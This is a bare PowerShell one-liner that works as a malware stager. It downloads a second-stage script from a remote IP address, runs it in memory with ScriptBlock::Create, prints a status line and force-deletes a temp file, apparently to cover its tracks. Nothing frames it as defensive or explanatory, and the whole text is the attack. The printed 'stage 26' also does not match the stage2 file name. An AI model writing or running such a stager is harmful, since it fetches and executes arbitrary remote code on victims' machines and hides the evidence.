
$PayloadText = (New-Object Net.WebClient).DownloadString("https://198.51.100.81/stage2.ps1"); & ([ScriptBlock]::Create($PayloadText)); Write-Output "stage 26 initialized"; Remove-Item -Path "$env:TEMP\stage2.bin" -Force
